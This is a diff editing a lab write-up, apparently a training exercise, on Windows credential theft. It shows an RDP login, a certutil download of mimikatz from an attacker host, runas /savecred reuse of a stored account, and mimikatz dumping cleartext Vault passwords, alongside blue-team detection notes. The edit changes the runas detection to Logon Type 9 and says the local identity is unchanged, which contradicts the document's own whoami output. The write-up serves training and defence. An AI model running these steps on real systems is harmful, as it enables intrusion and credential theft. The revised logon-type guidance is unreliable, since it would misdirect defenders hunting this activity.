@@ -1,6 +1,6 @@
 # Overview
 
-The lab simulates post-compromise credential access against a Windows workstation (ACADEMY-PWATTCK-CREDDEV01) where a low-privileged user has interactive access. The attacker objective was to recover credentials cached in the Windows Credential Manager and reuse a stored credential to execute code as another user. The target OneDrive credential for `mcharles` was recovered as the lab objective.
+The lab simulates post-compromise credential access against a Windows workstation (ACADEMY-PWATTCK-CREDDEV01) where a low-privileged user has interactive access. The objective was to recover credentials cached in the Windows Credential Manager by catching a shell as a higher-privileged user through a stored credential, then using mimikatz to dump that user's cleartext passwords. The target OneDrive credential for `mcharles` was recovered as the lab objective.
 
 ## MITRE ATT&CK Mapping
 
@@ -20,7 +20,7 @@ The lab simulates post-compromise credential access against a Windows workstatio
 
 #### Initial Access - RDP
 
-- Authenticated to the target over RDP using provided low-privileged credentials for `sadams`.
+- Authenticated to the target over RDP using the provided low-privileged credentials for `sadams`.
 
 ```bash
 xfreerdp /v:10.129.4.3 /u:sadams /p:totally2brow2harmon@
@@ -40,7 +40,7 @@ The hostname used for this connection (10.129.4.3:3389 [...])
 
 #### Tool Transfer - mimikatz
 
-- Served `mimikatz.exe` from the attacker host out of the local windows-resources directory.
+- Served `mimikatz.exe` from my attacker host out of the local windows-resources directory.
 
 ```bash
 cd /usr/share/windows-resources/mimikatz/x64/
@@ -66,9 +66,48 @@ CertUtil: -URLCache command completed successfully.
 - Attacker host: **10.10.14.122**
 - Transfer confirmed by two `GET /mimikatz.exe HTTP/1.1 200` entries in the HTTP server log.
 
+#### Stored Credential Reuse - runas /savecred
+
+- Enumerated saved credentials in Credential Manager and found a stored password for a higher-privileged account.
+
+```cmd
+cmdkey /list
+```
+
+```
+Currently stored credentials:
+
+    Target: Domain:interactive=SRV01\mcharles
+    Type: Domain Password
+    User: SRV01\mcharles
+```
+
+- Spawned a shell using the saved `SRV01\mcharles` credential without supplying a password.
+
+```cmd
+runas /savecred /user:SRV01\mcharles cmd.exe
+```
+
+```
+Attempting to start cmd.exe as user "SRV01\mcharles" ...
+```
+
+- Confirmed my execution context in the new shell.
+
+```cmd
+whoami
+```
+
+```
+srv01\mcharles
+```
+
+- Saved credential target: **Domain:interactive=SRV01\mcharles**
+- Resulting context: **srv01\mcharles** (code execution as a second user via `/savecred` with no password prompt)
+
 #### Credential Access - Windows Credential Manager
 
-- Executed mimikatz and dumped the Windows Vault / Credential Manager entries.
+- From the `mcharles` shell, executed mimikatz and dumped the Windows Vault / Credential Manager entries. Running in the `mcharles` context exposed that user's cached credentials.
 
 ```powershell
 .\mimikatz.exe
@@ -104,48 +143,9 @@ Credential : Inlanefreight#2025
 Attributes : 0
 ```
 
-- Recovered cleartext credential for the lab objective.
+- Recovered the cleartext credential for the lab objective.
 - OneDrive user: **mcharles@inlanefreight.local**
 - OneDrive password: **Inlanefreight#2025**
-
-#### Stored Credential Reuse - runas /savecred
-
-- Enumerated saved credentials in Credential Manager.
-
-```cmd
-cmdkey /list
-```
-
-```
-Currently stored credentials:
-
-    Target: Domain:interactive=SRV01\mcharles
-    Type: Domain Password
-    User: SRV01\mcharles
-```
-
-- Spawned a shell using the saved `SRV01\mcharles` credential without supplying a password.
-
-```cmd
-runas /savecred /user:SRV01\mcharles cmd.exe
-```
-
-```
-Attempting to start cmd.exe as user "SRV01\mcharles" ...
-```
-
-- Confirmed execution context in the new shell.
-
-```cmd
-whoami
-```
-
-```
-srv01\mcharles
-```
-
-- Saved credential target: **Domain:interactive=SRV01\mcharles**
-- Resulting context: **srv01\mcharles** (code execution as a second user via `/savecred` with no password prompt)
 
 #### Objective
 
@@ -155,7 +155,7 @@ srv01\mcharles
 #### Investigation (Blue Team)
 
 **1. RDP Authentication**
-**Attack Step:** Attacker logged into the workstation over RDP with valid low-privileged credentials.
+**Attack Step:** I logged into the workstation over RDP with valid low-privileged credentials.
 
 **Detection:**
 - Security log: Event ID 4624 (Logon Type 10, RemoteInteractive) for user `sadams`.
@@ -168,7 +168,7 @@ srv01\mcharles
 - Build a session timeline from LocalSessionManager session connect/reconnect/disconnect events.
 
 **2. Ingress Tool Transfer via certutil**
-**Attack Step:** Attacker downloaded mimikatz using `certutil` from an attacker-controlled HTTP server.
+**Attack Step:** I downloaded mimikatz using `certutil` from my HTTP server.
 
 **Detection:**
 - Sysmon: Event ID 1 (process creation) for `certutil.exe` with a URL argument and an output file.
@@ -181,8 +181,22 @@ srv01\mcharles
 - Pivot on the destination IP and port to find other hosts that contacted the same server.
 - Review the download directory for the dropped binary and preserve it for analysis.
 
-**3. Credential Access from Credential Manager (mimikatz)**
-**Attack Step:** Attacker ran mimikatz `vault::cred` to dump cleartext credentials stored in the Windows Vault.
+**3. Stored Credential Reuse (cmdkey / runas /savecred)**
+**Attack Step:** I listed saved credentials with `cmdkey` and used `runas /savecred` to execute `cmd.exe` as `SRV01\mcharles` without a password.
+
+**Detection:**
+- Sysmon: Event ID 1 / Security Event ID 4688 for `cmdkey.exe /list` and for `runas.exe` with `/savecred`.
+- Security log: Event ID 4624 Logon Type 9 (NewCredentials) for `SRV01\mcharles` originating from the `sadams` session, with a seclogo/`runas` logon process. No interactive logon occurs.
+- Security log: Event ID 4648 (logon attempt using explicit credentials) linking `sadams` to the `mcharles` target.
+
+**Investigation:**
+- Flag 4648 events where one user invokes explicit credentials for a different account on the same host.
+- Flag Logon Type 9 events, which indicate credentials being used only for outbound/other-identity access while the local session identity stays the same.
+- Confirm whether `SRV01\mcharles` credentials were legitimately saved on this workstation and, if not, revoke and rotate them.
+- Trace the child processes spawned under the `mcharles` context (the `runas` cmd.exe and any PowerShell launched with `-ep bypass`) to assess downstream activity.
+
+**4. Credential Access from Credential Manager (mimikatz)**
+**Attack Step:** From the `mcharles` shell I ran mimikatz `vault::cred` to dump cleartext credentials stored in that user's Windows Vault.
 
 **Detection:**
 - Sysmon: Event ID 1 and Security Event ID 4688 for `mimikatz.exe` execution; the on-disk name may differ, so match on image hash and signature anomalies.
@@ -193,16 +207,3 @@ srv01\mcharles
 - Review 5379 read events and identify the process and user that enumerated stored credentials.
 - Treat every credential cached in the affected Vault as compromised and scope which accounts and services they unlock (here, the OneDrive credential for `mcharles`).
 - Hunt for the mimikatz banner strings and module names in any captured process memory or EDR telemetry.
-
-**4. Stored Credential Reuse (cmdkey / runas /savecred)**
-**Attack Step:** Attacker listed saved credentials with `cmdkey` and used `runas /savecred` to execute `cmd.exe` as `SRV01\mcharles` without a password.
-
-**Detection:**
-- Sysmon: Event ID 1 / Security Event ID 4688 for `cmdkey.exe /list` and for `runas.exe` with `/savecred`.
-- Security log: Event ID 4624 Logon Type 2 for `SRV01\mcharles` originating from the `sadams` session, with a seclogo/`runas` logon process.
-- Security log: Event ID 4648 (logon attempt using explicit credentials) linking `sadams` to the `mcharles` target.
-
-**Investigation:**
-- Flag 4648 events where one user invokes explicit credentials for a different account on the same host.
-- Confirm whether `SRV01\mcharles` credentials were legitimately saved on this workstation and, if not, revoke and rotate them.
-- Trace the child processes spawned under the `mcharles` context (the `runas` cmd.exe and any PowerShell launched with `-ep bypass`) to assess downstream activity.
